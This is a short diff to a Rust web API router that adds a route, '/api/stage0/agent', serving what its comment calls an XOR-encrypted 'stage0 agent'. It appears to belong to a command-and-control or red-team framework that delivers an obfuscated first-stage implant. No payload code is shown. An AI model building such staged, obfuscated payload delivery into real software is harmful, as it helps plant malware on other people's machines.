@@ -62,6 +62,8 @@ pub fn create_api_router(state: Arc<ApiState>) -> Router {
         .route("/api/events", get(websocket::events_handler))
         // Status
         .route("/api/status", get(handlers::server_status))
+        // Stage0 agent download endpoint (XOR encrypted)
+        .route("/api/stage0/agent", get(handlers::download_stage0_agent))
         .layer(cors)
         .with_state(state)
 }
